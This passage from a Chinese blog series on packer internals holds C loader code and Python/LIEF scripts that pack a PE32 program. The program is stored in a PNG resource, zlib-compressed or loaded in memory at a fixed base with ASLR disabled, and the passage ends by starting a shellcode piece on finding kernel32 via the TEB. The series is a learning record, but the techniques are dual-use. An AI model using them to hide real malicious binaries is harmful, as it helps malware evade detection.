path.join(src_dir, \u0026#39;rsrc.o\u0026#39;))   就得到了 rsrc.o 。\n3.3 编译加载器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  # compile shifted loader program def compile(sources, flags): args = \u0026#39;\u0026#39; compiler = \u0026#39;gcc\u0026#39; args += \u0026#39;\u0026#39; if isinstance(sources, (str, bytes)): args += sources elif isinstance(sources, (list, tuple)): args += \u0026#39; \u0026#39;.join(sources) args += \u0026#39; \u0026#39; if isinstance(flags, (str, bytes)): args += flags elif isinstance(flags, (list, tuple)): args += \u0026#39; \u0026#39;.join(flags) cmd = f\u0026#39;{compiler}{args}\u0026#39; proc = run(cmd, shell=True, stderr=STDOUT) if proc.returncode != 0: raise CompilationError(proc.returncode, proc.stdout) cflags = [ \u0026#39;-m32\u0026#39;, \u0026#39;-O2\u0026#39;, \u0026#39;-Wall\u0026#39;, \u0026#39;-I.\u0026#39;, \u0026#39;-Wl,--entry=__start\u0026#39;, \u0026#39;-nodefaultlibs\u0026#39;, \u0026#39;-nostartfiles\u0026#39;, \u0026#39;-lkernel32\u0026#39;, \u0026#39;-luser32\u0026#39;, \u0026#39;-lmsvcrt\u0026#39;, \u0026#39;-lpng\u0026#39;, \u0026#39;-o\u0026#39;, \u0026#39;packed.exe\u0026#39; ] compile([path.join(src_dir, src) for src in [\u0026#39;loader.c\u0026#39;, \u0026#39;png_decode.c\u0026#39;, \u0026#39;rsrc.o\u0026#39;]], cflags) print(\u0026#39;[+] compile loader with resource success.\u0026#39;)   主要是加上 -lpng 链接参数，链接 libpng 。输入文件里加上 png_decode.c 这个里面实现了 read_program_from_png，还有编译好的资源 rsrc.o。\n0x04 成果展示 4.1 完整代码 github.com - packer05\n4.2 成果 总结 这次实验主要是验证了从资源加载程序，本质和之前的其他加壳方式没有区别。把应用程序转换成图片后看到的效果确实比较有趣，我想如果用一张普通的图片或者其他文件类型，藏起来可能更隐蔽。\n但到这里还是有明显的问题：壳和被加载的程序还是泾渭分明。\n","date":"2021-10-21T21:17:00+08:00","image":"https://nnnewb.github.io/blog/p/learning-packer-05/cover_hu8b7651a2bda3b235d3ed49f67a1e20bd_99156_120x120_fill_q75_box_smart1.jpg","permalink":"https://nnnewb.github.io/blog/p/learning-packer-05/","title":"加壳原理05：利用图片隐藏"},{"content":"前言 本文在前一篇基础上，写一个使用 zlib 的压缩壳案例。\n0x01 zlib 解压 1.1 概述 关于 zlib 的用法找了这些参考资料：\n zlib.net/zpipe.c zlib Usage Example Compress and Decompress a string with zlib  尝试了 zlib、lzo、Windows Compression API，对压缩和解压 API 的基本模式的基本认识大概是这样：\n 首先，你得有被压缩数据的大小（要么分块压缩，要么有整个压缩后的大小） 然后得有解压后的预期大小，这个能通过 尝试解压 的操作来实现。比如 Windows Compression API 和 lzo 都可以在解压 buffer 传 NULL，尝试取得解压后的大小，再分配好内存解压。 zlib 这样的流式压缩、解压处理文件比较友好，但全程在内存里进行的话，流式解压就会导致大量内存分配 =。= 除非一开始就分配足够的空间，不然一个一个内存块申请和合并会很蛋疼。  1.2 内存布局 压缩后的 .packed 节在头部留出 8 个字节，分别保存压缩后大小和压缩前大小，以便一次分配好内存完成解压。\n   偏移 大小 内容     0 DWORD 小端序，压缩后大小   4 DWORD 小端序，压缩前大小   8 可变 压缩后的数据    1.3 解压代码 解压过程在加载 PE 之前，找到 .packed 节后，开始读取头部大小，并调用解压代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  if (packed != NULL) { DWORD compressed_size = *((DWORD *)packed); // compressed size little-endian  DWORD decompressed_size = *((DWORD *)(packed + 4)); // decompressed size little-endian  void *compressed = (void *)(packed + 8); // compressed buffer  void *decompressed = malloc(decompressed_size); // decompressed buffer  if (decompressed == NULL) { MessageBoxA(NULL, \u0026#34;memory allocate failed\u0026#34;, \u0026#34;malloc\u0026#34;, MB_OK); return 0; } decompress(compressed, compressed_size, decompressed, decompressed_size); void (*entrypoint)(void) = (void (*)(void))load_PE(decompressed); entrypoint(); return 0; }   应该没有太多疑问。接下来的是解压代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  void decompress(void *compressed, size_t length, void *decompressed, size_t decompressed_length) { z_stream inflate_stream; inflate_stream.zalloc = Z_NULL; inflate_stream.zfree = Z_NULL; inflate_stream.opaque = Z_NULL; inflate_stream.avail_in = (uInt)length; inflate_stream.next_in = (Bytef *)compressed; inflate_stream.avail_out = (uInt)decompressed_length; inflate_stream.next_out = (Bytef *)decompressed; inflateInit(\u0026amp;inflate_stream); int err = inflate(\u0026amp;inflate_stream, Z_NO_FLUSH); if (err != Z_STREAM_END) { inflateEnd(\u0026amp;inflate_stream); MessageBoxA(NULL, \u0026#34;zlib decompression failed\u0026#34;, \u0026#34;zlib\u0026#34;, MB_OK); return; } inflateEnd(\u0026amp;inflate_stream); return; }   定义 inflate 流：\n avail_in 是可用的输入 buffer 大小 avail_out 是可用的输出 buffer 大小 next_in 是输入 buffer 的指针 next_out 是输出 buffer 的指针 zalloc、zfree、opaque 初始化成 NULL  使用 inflateInit() 初始化流，然后调用 inflate() 解压。inflate() 会返回错误码，如果长度正好，会返回 Z_STREAM_END。如果输出 buffer 长度不足，但解压成功，会返回 Z_OK。其他情况会返回错误码。因为这里很清楚给定的压缩前长度，解压必定返回 Z_STREAM_END，其他情况都有问题，所以只做了一个判断。\n对于其他情况，错误码可以用 zError 获取错误描述。\n解压结束后要使用 inflateEnd() 关闭流。\n0x02 zlib压缩 因为使用 python 写加壳机，就不用这么麻烦了。\n在处理 .packed 节的时候，使用 struct 和 zlib 两个 python 自带的库就能完成压缩和填充头。\n在脚本头部添加两句 import\n1 2  import struct import zlib   然后修改加壳代码中，添加 .packed 节的代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  # add packed section with open(\u0026#39;example.exe\u0026#39;, \u0026#39;rb\u0026#39;) as f: file_content = f.read() origin_length = len(file_content) compressed = zlib.compress(file_content, 9) compressed_length = len(compressed) section_content = struct.pack(\u0026#39;\u0026lt;II\u0026#39;, compressed_length, origin_length) section_content += compressed packed_section = lief.PE.Section(\u0026#39;.packed\u0026#39;) packed_section.content = list(section_content) packed_section.characteristics = (lief.PE.SECTION_CHARACTERISTICS.MEM_READ | lief.PE.SECTION_CHARACTERISTICS.CNT_INITIALIZED_DATA) output.add_section(packed_section)   可以看到使用 zlib.compress 就完成了压缩，不用原始 zlib 流那么麻烦。\nstruct.pack 指定了小端序，两个4字节int，分别填写压缩后大小和原始大小，连接压缩后的数据，填充进.packed 节。\n就这样，压缩功能成功完成。\n0x03 成果展示 总结 偷懒了，用了一些 msvcrt 的函数，比如 malloc，要加个 -lmsvcrt 链接选项。最终成品压缩率还可以，从107KB 压缩到了 49KB，zlib 不负期望。\n写好壳程序之后，不管是加密还是压缩都是很容易的事情（指单纯做个简单实现），但问题依然存在：\n 64位程序——我觉得可以以后再说吧？我连64位汇编都还不会（泪）。 脱壳跟玩一样——现在看 .packed 已经没有 MZ 这个摆明了是原始程序的标志了，但并没有卵用。壳程序也没混淆和反调试，节表也是清晰可见，根本不用分析。  下一篇还没想好做什么，得先继续学习充实下自己，找个方向。\n","date":"2021-10-20T16:07:00+08:00","image":"https://nnnewb.github.io/blog/p/learning-packer-04-zlib-compression-packer-demo/cover_hu8b7651a2bda3b235d3ed49f67a1e20bd_99156_120x120_fill_q75_box_smart1.jpg","permalink":"https://nnnewb.github.io/blog/p/learning-packer-04-zlib-compression-packer-demo/","title":"加壳原理04 - zlib压缩壳案例"},{"content":"前言 距离上一篇加壳原理已经过去挺久了，这段时间稍微折腾了一下 nasm，尝试手工制作了 PE32 文件，积累了一些基本的知识吧。\n所以现在继续学习加壳——如何对不支持 ASLR 的 PE32 程序进行加壳？\n0x01 关于ASLR ASLR是一项内存保护技术，用于防范内存损坏漏洞，比如缓冲区溢出。需要注意的是 ASLR 并不是 解决 了相关威胁，而是让利用相关的漏洞变得更加困难和具有挑战性。\nASLR 的全名是 Address Space Layout Randomization ，地址空间布局随机化技术。一个典型的 PE32 程序在没有 ASLR 支持的情况下， 地址空间布局是确定的：程序镜像总会加载到固定的地址。这个地址会在文件头里指定。攻击者可以利用这一特点来构造恶意数据，让存在内存损坏漏洞的程序按攻击者意图跳过或执行特定逻辑，造成安全威胁。\n对应 ASLR 的地址空间布局随机化，程序需要再次编译来支持重定位 Relocation ，别无他法（大概）。\n0x02 思路 对于加壳一个没有重定位，不支持 ASLR 的 PE32 程序，假设这个程序的基址是 0x04000000，原先的 VirtualAlloc 方式分配内存是行不通的。加壳后程序若开启 ASLR，则 0x04000000 可能已经存在其他模块，并不能保证这个基址可用。所以加壳后的程序必须也使用 0x04000000 这个基址，而且标记为不支持 ASLR，避免基址已经被其他模块使用造成加载器无法工作。\n将加壳后程序的基址设置为固定的 0x04000000 又会产生新的问题：加载器的代码段不能放在 0x04000000 ，否则加载器运行时就会出现被被加载的代码覆盖的情况，导致程序跑飞。所以编译后的加载器所有 Section 都必须有一定的偏移，这个偏移值就是被加载程序的 Section 大小之和（对齐后）。而因此多出来的空间单独分成一个 Section ，正好用来放要加载的程序。\n另外，还必须确认文件头大小是否一致，因为我们需要将被加载程序的文件头覆盖加载器的文件头。而最开始预留的空间必须分配为一个 Section，让 Windows 的加载器能顺利加载程序而不报“不是有效的Win32程序”错误。\n内存布局示意图如下：\n所以加载器的加载步骤如下：\n 寻找被加载的 Section 。 复制文件头覆盖自己的文件头。 以自己的基址为被加载程序的基址，完成加载。  加壳机的加壳步骤如下：\n 解析被加壳程序，获取 Section 大小、文件头大小、对齐大小等信息。 生成加载器程序，根据上一步取得的数据计算出加载器 Section 的偏移和对齐。 合并被加壳程序和加载器，生成被加壳程序。  案例程序如下：\n1 2 3 4 5 6  #include \u0026lt;Windows.h\u0026gt; int main(void) { MessageBoxA(NULL, \u0026#34;Hello world!\u0026#34;, \u0026#34;MSGBOX\u0026#34;, MB_OK); return 0; }   0x03 加载器修改 加载器需要把 VirtualAlloc 改成 GetModuleHandleA，并解除当前程序文件头的写保护，并在随后的复制 Section 阶段同样用 VirtualProtect 解除写保护，添加执行权限。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  void *load_PE(char *PE_data) { IMAGE_DOS_HEADER *p_DOS_header = (IMAGE_DOS_HEADER *)PE_data; IMAGE_NT_HEADERS *p_NT_headers = (IMAGE_NT_HEADERS *)(PE_data + p_DOS_header-\u0026gt;e_lfanew); // extract information from PE header  DWORD size_of_image = p_NT_headers-\u0026gt;OptionalHeader.SizeOfImage; DWORD entry_point_RVA = p_NT_headers-\u0026gt;OptionalHeader.AddressOfEntryPoint; DWORD size_of_headers = p_NT_headers-\u0026gt;OptionalHeader.SizeOfHeaders; // base address  char *p_image_base = (char *)GetModuleHandleA(NULL); if (p_image_base == NULL) { return NULL; } // make sure we can write in allocated memory  DWORD oldProtect; VirtualProtect(p_image_base, p_NT_headers-\u0026gt;OptionalHeader.SizeOfHeaders, PAGE_READWRITE, \u0026amp;oldProtect); // copy PE headers in memory  mymemcpy(p_image_base, PE_data, size_of_headers); // Section headers starts right after the IMAGE_NT_HEADERS struct, so we do some pointer arithmetic-fu here.  IMAGE_SECTION_HEADER *sections = (IMAGE_SECTION_HEADER *)(p_NT_headers + 1); for (int i = 0; i \u0026lt; p_NT_headers-\u0026gt;FileHeader.NumberOfSections; i++) { // calculate the VA we need to copy the content, from the RVA  // section[i].VirtualAddress is a RVA, mind it  char *dest = p_image_base + sections[i].VirtualAddress; // check if there is Raw data to copy  if (sections[i].SizeOfRawData \u0026gt; 0) { // make sure we can write in allocated sections  VirtualProtect(dest, sections[i].SizeOfRawData, PAGE_READWRITE, \u0026amp;old_protect); // We copy SizeOfRaw data bytes, from the offset PointerToRawData in the file  mymemcpy(dest, PE_data + sections[i].PointerToRawData, sections[i].SizeOfRawData); } else { VirtualProtect(dest, sections[i].Misc.VirtualSize, PAGE_READWRITE, \u0026amp;old_protect); for (size_t i = 0; i \u0026lt; sections[i].Misc.VirtualSize; i++) { dest[i] = 0; } } } // ... }   此外还有一个坑：不知道为啥，我用 lief python 生成的 DataDirectories 实际只有15个元素（包括最后一个 null 元素），但 winnt.h 里定义的 DataDirectories 是固定长度 16 个元素，所以直接算 p_NT_header + 1 得到的偏移值会比预期的大 8 个字节，导致报找不到 .packed 。\n改成这样。\n1 2 3 4 5 6 7 8 9 10  int _start(void) { char *unpacker_VA = (char *)GetModuleHandleA(NULL); IMAGE_DOS_HEADER *p_DOS_header = (PIMAGE_DOS_HEADER)unpacker_VA; IMAGE_NT_HEADERS *p_NT_headers = (PIMAGE_NT_HEADERS)(unpacker_VA + p_DOS_header-\u0026gt;e_lfanew); IMAGE_SECTION_HEADER *sections = (PIMAGE_SECTION_HEADER)(p_NT_headers + 1); // 注意看这里再计算了一次偏移  sections = (PIMAGE_SECTION_HEADER)((char *)sections - (IMAGE_NUMBEROF_DIRECTORY_ENTRIES - p_NT_headers-\u0026gt;OptionalHeader.NumberOfRvaAndSizes) * sizeof(IMAGE_DATA_DIRECTORY));   0x04 加壳器 加壳器这次用 python 写，MinGW 下又要重新编译 LIEF 太折磨人了。\n4.1 工具函数 先是导入和定义必要的工具。\n1 2 3 4 5  import lief def align(x, al): \u0026#34;\u0026#34;\u0026#34; return \u0026lt;x\u0026gt; aligned to \u0026lt;al\u0026gt; \u0026#34;\u0026#34;\u0026#34; return ((x+(al-1))//al)*al   4.2 解析 先分析案例程序，获得必要的数据。\n1 2 3 4 5 6 7 8  binary = lief.PE.parse(\u0026#39;example.exe\u0026#39;) # calculate shift offset and reserved section size image_base = binary.optional_header.imagebase lowest_rva = min([s.virtual_address for s in binary.sections]) highest_rva = max([s.virtual_address + s.size for s in binary.sections]) sect_alignment = binary.optional_header.section_alignment print(\u0026#39;[+] analyze origin demo program binary success.\u0026#39;)   取得基址、所有 section 中最低的起始 rva 和最高的结束 rva，得到整个 PE 镜像的 Sections 覆盖的内存范围。\n4.3 构造加载器 使用 MinGW 来完成加载器构造——当然有其他更好的做法，加壳还要装一个 MinGW 未免太麻烦，但我也不知道该怎么做就是了（我猜的话，大概拿 nasm 应该就刑。）\n编译命令在 Python 脚本里生成并执行。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  # compile shifted loader program compile_args = [ \u0026#39;loader.c\u0026#39;, \u0026#39;-m32\u0026#39;, \u0026#39;-O2\u0026#39;, \u0026#39;-Wall\u0026#39;, \u0026#39;-Wl,--entry=__start\u0026#39;, \u0026#39;-nodefaultlibs\u0026#39;, \u0026#39;-nostartfiles\u0026#39;, \u0026#39;-lkernel32\u0026#39;, \u0026#39;-luser32\u0026#39;, f\u0026#39;-Wl,--image-base={hex(image_base)}\u0026#39;, f\u0026#39;-Wl,--section-start=.text={hex(align(image_base+highest_rva,sect_alignment))}\u0026#39;, \u0026#39;-o\u0026#39;, \u0026#39;shifted-loader.exe\u0026#39; ] try: check_output(\u0026#39; \u0026#39;.join([\u0026#39;gcc\u0026#39;, *compile_args]), shell=True, stderr=STDOUT) print(\u0026#39;[+] compile shifted loader program success.\u0026#39;) except CalledProcessError as e: print(f\u0026#39;[!] loader compilation failed, {e.stdout.decode()}\u0026#39;) raise shifted_loader = lief.PE.parse(\u0026#39;shifted-loader.exe\u0026#39;) sect_alignment = shifted_loader.optional_header.section_alignment file_alignment = shifted_loader.optional_header.file_alignment   -luser32 是因为我添加了一个 MessageBoxA 的调用。\n-Wl,--image-base=... 设置了加载器的基址，确保加载器和被加壳的程序落在同一个基址上。\n-Wl,--section-start=... 因为知道第一个 section 一定是 .text 所以只设置了第一个 section 的地址，之后的 section 会自动往后挪。\n其他参数不多解释了。\n编译完成后，再解析出加载器的对齐信息，准备用于构造完整的被加壳程序。\n4.4 构造加壳程序 加载器和被加载的程序都已经就绪，接下来就是把加载器和程序合并成加壳后的程序了。这一步还是先在创建 lief 的PE32 对象，然后填充基址、Section 对齐、文件对齐，并且把 DLL Characteristics 重置到 0，目的是声明不支持 ASLR。\n1 2 3 4 5 6 7 8 9 10  # create new binary from scratch output = lief.PE.Binary(\u0026#39;packed\u0026#39;, lief.PE.PE_TYPE.PE32) # copy essential fields from shifted_loader output.optional_header.imagebase = shifted_loader.optional_header.imagebase output.optional_header.section_alignment = shifted_loader.optional_header.section_alignment output.optional_header.file_alignment = shifted_loader.optional_header.file_alignment # disable ASLR output.optional_header.dll_characteristics = 0   先准备这些文件头字段，接下来开始填充 Section ，最先填充的就是准备用作被加载程序内存空间的 .alloc 节。\n1 2 3 4 5 6 7 8 9  # add .alloc section allocate_size = align(highest_rva-lowest_rva, sect_alignment) allocate_section = lief.PE.Section(\u0026#34;.alloc\u0026#34;) allocate_section.virtual_address = lowest_rva allocate_section.virtual_size = allocate_size allocate_section.characteristics = (lief.PE.SECTION_CHARACTERISTICS.MEM_READ | lief.PE.SECTION_CHARACTERISTICS.MEM_WRITE | lief.PE.SECTION_CHARACTERISTICS.CNT_UNINITIALIZED_DATA) output.add_section(allocate_section)   将 .alloc 节起始点放置在低位，长度为被加载程序的节大小之和对齐。\n之后开始复制加载器的节。\n1 2 3 4 5 6  # copy sections for s in shifted_loader.sections: # let lief recalculate section offset and sizeof raw data s.offset = 0 s.sizeof_raw_data = 0 output.add_section(s)   需要注意 把 offset 和 sizeof_raw_data 置零，让 lief 去计算偏移和大小，后面添加的一应节都按这样操作。新创建的 Section 还好，对于从加载器里复制的 Section，保留 offset 和 sizeof_raw_data 会导致最终成品的 Section 数据不正确，造成 ntdll 里加载PE文件时，读取PE数据结构时出错。可以自行用 x32dbg 验证。\n最后把被加载的文件打包进去。\n1 2 3 4 5 6 7  # add packed section with open(\u0026#39;example.exe\u0026#39;, \u0026#39;rb\u0026#39;) as f: packed_section = lief.PE.Section(\u0026#39;.packed\u0026#39;) packed_section.content = list(f.read()) packed_section.characteristics = (lief.PE.SECTION_CHARACTERISTICS.MEM_READ | lief.PE.SECTION_CHARACTERISTICS.CNT_INITIALIZED_DATA) output.add_section(packed_section)   同样，让 lief 去计算偏移和大小。复制好节，继续复制 Data Directories，这又有一个坑。\n1 2 3 4 5 6 7 8 9  # copy data directories for i in range(0, 15): src = shifted_loader.data_directories[i] output.data_directories[i].rva = src.rva output.data_directories[i].size = src.size # correct number of data directories # warning: size of data directories may disagree with IMAGE_NT_HEADERS.DataDirectory in winnt.h output.optional_header.numberof_rva_and_size = len(output.data_directories)   需要注意到，lief 的数据结构里，允许的 data_directories 只有 15 个！但 winnt.h 里定义的 DATA_DIRECTORIES 数组，是固定16个元素！\n如果直接 range(16) 去遍历，会出现 IndexError ，如果忽视这个长度问题，直接在加载器里采用 Windows SDK 的头文件定义的结构，会导致取节表指针的时候比预期的多偏移 8 个字节，造成问题。调试起来简直太折磨人了。\n之后再复制入口点和镜像大小。\n1 2 3 4  # copy original address of entrypoint output.optional_header.addressof_entrypoint = shifted_loader.optional_header.addressof_entrypoint # let lief recalculate size of image output.optional_header.sizeof_image = 0   注意，入口点和镜像大小的字段必须在复制完 Section 之后再复制，不然 lief 会犯傻，原因不明，有兴趣可以自己改一改顺序看看结果。\n到这里，基本准备就绪，就可以把构造好的可执行文件写入硬盘了。\n1 2 3 4  # build output binary builder = lief.PE.Builder(output) builder.build() builder.write(\u0026#39;packed.exe\u0026#39;)   4.5 完整代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115  # %% import lief from subprocess import STDOUT, CalledProcessError, check_output def align(x, al): \u0026#34;\u0026#34;\u0026#34; return \u0026lt;x\u0026gt; aligned to \u0026lt;al\u0026gt; \u0026#34;\u0026#34;\u0026#34; return ((x+(al-1))//al)*al # %% # compile origin demo program try: check_output(\u0026#39;gcc example.c -m32 -O2 -o example.exe\u0026#39;, shell=True, stderr=STDOUT) except CalledProcessError as e: print(f\u0026#39;[!] demo program compilation failed, {e.stdout.decode()}\u0026#39;) raise binary = lief.PE.parse(\u0026#39;example.exe\u0026#39;) print(\u0026#39;[+] compile origin demo program success.\u0026#39;) # %% # calculate shift offset and reserved section size image_base = binary.optional_header.imagebase lowest_rva = min([s.virtual_address for s in binary.sections]) highest_rva = max([s.virtual_address + s.size for s in binary.sections]) sect_alignment = binary.optional_header.section_alignment print(\u0026#39;[+] analyze origin demo program binary success.\u0026#39;) # %% # compile shifted loader program compile_args = [ \u0026#39;loader.c\u0026#39;, \u0026#39;-m32\u0026#39;, \u0026#39;-O2\u0026#39;, \u0026#39;-Wall\u0026#39;, \u0026#39;-Wl,--entry=__start\u0026#39;, \u0026#39;-nodefaultlibs\u0026#39;, \u0026#39;-nostartfiles\u0026#39;, \u0026#39;-lkernel32\u0026#39;, \u0026#39;-luser32\u0026#39;, f\u0026#39;-Wl,--image-base={hex(image_base)}\u0026#39;, f\u0026#39;-Wl,--section-start=.text={hex(align(image_base+highest_rva,sect_alignment))}\u0026#39;, \u0026#39;-o\u0026#39;, \u0026#39;shifted-loader.exe\u0026#39; ] try: check_output(\u0026#39; \u0026#39;.join([\u0026#39;gcc\u0026#39;, *compile_args]), shell=True, stderr=STDOUT) print(\u0026#39;[+] compile shifted loader program success.\u0026#39;) except CalledProcessError as e: print(f\u0026#39;[!] loader compilation failed, {e.stdout.decode()}\u0026#39;) raise shifted_loader = lief.PE.parse(\u0026#39;shifted-loader.exe\u0026#39;) sect_alignment = shifted_loader.optional_header.section_alignment file_alignment = shifted_loader.optional_header.file_alignment # %% # create new binary from scratch output = lief.PE.Binary(\u0026#39;packed\u0026#39;, lief.PE.PE_TYPE.PE32) # copy essential fields from shifted_loader output.optional_header.imagebase = shifted_loader.optional_header.imagebase output.optional_header.section_alignment = shifted_loader.optional_header.section_alignment output.optional_header.file_alignment = shifted_loader.optional_header.file_alignment # disable ASLR output.optional_header.dll_characteristics = 0 # add .alloc section allocate_size = align(highest_rva-lowest_rva, sect_alignment) allocate_section = lief.PE.Section(\u0026#34;.alloc\u0026#34;) allocate_section.virtual_address = lowest_rva allocate_section.virtual_size = allocate_size allocate_section.characteristics = (lief.PE.SECTION_CHARACTERISTICS.MEM_READ | lief.PE.SECTION_CHARACTERISTICS.MEM_WRITE | lief.PE.SECTION_CHARACTERISTICS.CNT_UNINITIALIZED_DATA) output.add_section(allocate_section) # copy sections for s in shifted_loader.sections: # let lief recalculate section offset and sizeof raw data s.offset = 0 s.sizeof_raw_data = 0 output.add_section(s) # add packed section with open(\u0026#39;example.exe\u0026#39;, \u0026#39;rb\u0026#39;) as f: packed_section = lief.PE.Section(\u0026#39;.packed\u0026#39;) packed_section.content = list(f.read()) packed_section.characteristics = (lief.PE.SECTION_CHARACTERISTICS.MEM_READ | lief.PE.SECTION_CHARACTERISTICS.CNT_INITIALIZED_DATA) output.add_section(packed_section) # copy data directories for i in range(0, 15): src = shifted_loader.data_directories[i] output.data_directories[i].rva = src.rva output.data_directories[i].size = src.size # correct number of data directories # warning: size of data directories may disagree with IMAGE_NT_HEADERS.DataDirectory in winnt.h output.optional_header.numberof_rva_and_size = len(output.data_directories) # copy original address of entrypoint output.optional_header.addressof_entrypoint = shifted_loader.optional_header.addressof_entrypoint # let lief recalculate size of image output.optional_header.sizeof_image = 0 # build output binary builder = lief.PE.Builder(output) builder.build() builder.write(\u0026#39;packed.exe\u0026#39;) print(\u0026#39;[+] create packed binary success.\u0026#39;)   只放一下加载器代码，一共三个代码文件托管在 Gist 上，需要安装 MinGW 和 LIEF，配置方式不赘述。还不会 C 和 Python 的话建议学一下先呢。\n完整代码的 GIST\n0x05 成果 加壳机运行效果。\npacked.exe 的节表信息如下。\n结论 整个过程里踩了不少坑，几乎都要靠 x32dbg 调试和 CFF Explorer 挨个文件头字段检查。有个比较实用的做法是拿 LIEF 解析好加壳后的文件，把输出结果和原始加载器对比。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  import lief packed = lief.PE.parse(\u0026#39;packed.exe\u0026#39;) loader = lief.PE.parse(\u0026#39;shifted-loader.exe\u0026#39;) with open(\u0026#39;packed-analysis.txt\u0026#39;, \u0026#39;w+\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as out: print(\u0026#39;-----\u0026#39;*20, file=out) print(\u0026#39;packed.exe\u0026#39;, file=out) print(\u0026#39;-----\u0026#39;*20, file=out) print(packed.header, file=out) print(packed.optional_header, file=out) for entry in packed.data_directories: print(entry, file=out) for s in packed.sections: print(s, file=out) with open(\u0026#39;loader-analysis.txt\u0026#39;, \u0026#39;w+\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as out: print(\u0026#39;-----\u0026#39;*20, file=out) print(\u0026#39;shifted-loader.exe\u0026#39;, file=out) print(\u0026#39;-----\u0026#39;*20, file=out) print(loader.header, file=out) print(loader.optional_header, file=out) for entry in loader.data_directories: print(entry, file=out) for s in loader.sections: print(s, file=out)   分析好之后就可以拿 vscode 去比较了。\n1  code -n -d packed-analysis.txt loader-analysis.txt   比起直接拿 CFF Explorer 硬看字段哪儿不对，和编译器产生的正常文件比较能排除掉一些无关的字段。但也不是万能，比如说之前没有写 section.offset=0，结果生成的 PE32 文件导入表内容坏了，一直没意识到。直到 x32dbg 调试中发现 ntdll 里加载导入表时碰到了一个无效地址（我怎么知道是加载导入表时呢，胆大心细加上99%的运气\u0026hellip;），然后看 CFF Explorer 才发现导入表完全挂了，再回头看节表才发现 .idata 的偏移和大小都是坏的\u0026hellip;\n还有 data directories 的坑，也是靠 x32dbg，跳转到内存，才发现 (IMAGE_SECTION_HEADER*)(PIMAGE_NT_HEADERS+1) 算出来的偏移值多了8字节，冥思苦想这8字节怎么回事，胡乱分析，然后突然意识到 data directory 正好 8 字节，加壳机里又有个很迷惑的 range(0,15)，反复确认了几次才发现真的是 LIEF 就给了 15 个 Data directory —— 但 Windows SDK 里 winnt.h 定义的是 固定 16 个元素 ，之后去翻 PE Format 文档才发现微软早就挖好了这个坑等你翻文档：\n Note that the number of directories is not fixed. Before looking for a specific directory, check the NumberOfRvaAndSizes field in the optional header.\n 原先的文章预计是要做一个压缩壳，简单试验了一下没啥难度，代码都不用几行（VS+CMake+VCPKG 同时用 LIEF 和 ZLIB/LZO 什么的有点费劲，所以用 Windows Compression API），就这样水一篇文章有点不好意思。所以就先去看怎么对付不能重定位的PE32了，结果搞 LIEF 的各种环境编译、折腾VC++的Pragma、翻 Linker Script 手册看能不能改节表偏移、学NASM、从国庆坑到现在。\n本篇的参考文章是：https://bidouillesecurity.com/tutorial-writing-a-pe-packer-part-4/\n文中有些地方比较怪，比如说先编译了正常 loader 再编译 shifted_loader 就让人不是很理解，照抄抄出一堆bug。所以本文的脚本和参考的脚本已经有点对不上了。\n受制于不知道怎么编译出没有重定位的程序，我拿一个有重定位的做了实验（理论上来说，应该是一样的吧？），所以到头也不确定是不是真的能把没有重定位的程序跑起来。\n就这样吧，这个结论有点长。到这就差不多了。\n","date":"2021-10-20T10:25:00+08:00","image":"https://nnnewb.github.io/blog/p/learning-packer-03-support-no-relocations/cover_hu8b7651a2bda3b235d3ed49f67a1e20bd_99156_120x120_fill_q75_box_smart1.jpg","permalink":"https://nnnewb.github.io/blog/p/learning-packer-03-support-no-relocations/","title":"加壳原理03 - 支持没有重定位的程序"},{"content":"前言 总得有个前言。\n用 nasm 手工打造了一个 PE 文件后，这个 PE 文件还没什么卵用。如果要动 IAT，又嫌麻烦。网上冲浪找到一篇关于 shellcode 的文章，讲如何在内存里找到 kernel32.dll 并调用 WinExec 函数，于是就想实践一下看看，实际抄代码碰到不少坑。对汇编又熟悉了一点。\n0x01 寻找 kernel32 微软有一篇很简短的文章。\n The Thread Environment Block (TEB structure) holds context information for a thread.\nIn the following versions of Windows, the offset of the 32-bit TEB address within the 64-bit TEB is 0. This can be used to directly access the 32-bit TEB of a WOW64 thread. This might change in later versions of Windows\n 另外在维基百科页面也有一点概述，TIB 就是 TEB 。TIB 全称是 Thread Information Block ，TEB 是 Thread Environment Block 。\n关于 TIB 和 TEB 的微软官方文档和文章链接很多都失效了，能找到的相关信息不多。但是微软至少还给出了 TEB 的结构定义吧（在Windows SDK 里）。\n1 2 3 4 5 6 7 8 9 10 11 12  typedef struct _TEB { PVOID Reserved1[12]; PPEB ProcessEnvironmentBlock; PVOID Reserved2[399]; BYTE Reserved3[1952]; PVOID TlsSlots[64]; BYTE Reserved4[8]; PVOID Reserved5[26]; PVOID ReservedForOle; PVOID Reserved6[4]; PVOID TlsExpansionSlots; } TEB, *PTEB;   大量的刺眼的 Reserved 。不过还好，花了点时间还是谷歌出了所谓的Undocumented的相关信息。NTAPI Undocumented Function。也可以像我看的那篇文章一样，用 WinDbg Preview 去实际看看内存里的结构。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  typedef struct _TEB { NT_TIB Tib; PVOID EnvironmentPointer; CLIENT_ID Cid; PVOID ActiveRpcInfo; PVOID ThreadLocalStoragePointer; PPEB Peb; ULONG 